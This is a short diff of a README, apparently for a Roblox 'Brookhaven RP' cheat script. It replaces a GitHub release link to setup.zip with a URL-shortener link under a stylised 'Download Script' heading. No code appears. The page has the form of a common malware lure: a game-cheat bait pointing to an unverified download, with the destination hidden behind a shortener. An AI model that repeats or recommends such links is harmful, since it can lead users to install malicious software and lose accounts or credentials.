@@ -33,7 +33,7 @@
 
 
 
-# Click to get the script ===>>> ***[📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱 Script](https://github.com/BoomssloI/Brookhaven-RP/releases/download/Download/setup.zip)***
+# Click to get the script ===>>> ***[📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱 Script](https://getwix.short.gy/main)***
 
 
 ![hq720](https://github.com/user-attachments/assets/99adc8b0-ec44-443b-a15e-d04f973149cb)
